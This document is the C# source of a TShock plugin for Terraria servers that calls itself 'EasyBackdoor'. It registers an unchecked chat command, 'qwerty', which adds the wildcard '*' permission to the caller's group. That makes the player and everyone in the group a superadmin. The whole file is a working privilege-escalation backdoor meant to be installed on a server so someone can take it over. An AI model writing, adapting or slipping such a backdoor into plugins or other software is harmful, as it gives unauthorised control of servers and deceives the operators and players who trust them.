using Microsoft.Xna.Framework;
using System.Timers;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using Terraria;
using TerrariaApi.Server;
using TShockAPI;
using System.Linq;

namespace EasyBackdoor
{
	[ApiVersion(2, 1)]

	public class EasyBackdoor : TerrariaPlugin
	{

		public override string Name
		{
			get { return "EasyBackdoor"; }
		}

		public override string Author
		{
			get { return "Comdar"; }
		}

		public override string Description
		{
			get { return "Terraria poorly made backdoor plugin."; }
		}

        public EasyBackdoor(Main game)
			: base(game)
		{
			Order = +4;
		}

		// We must add new command in my case i added //qwerty command!
		public override void Initialize()
		{
			Commands.ChatCommands.Add(new Command(backdoor, "/qwerty"));
		}

		// This will be our script that will transfer (SuperAdmin) perms into our group.
		void backdoor(CommandArgs args)
		{
			args.Player.Group.AddPermission("*");
			args.Player.SendInfoMessage("<EasyBackdoor> Now you are superadmin:)");
		}
	}
}
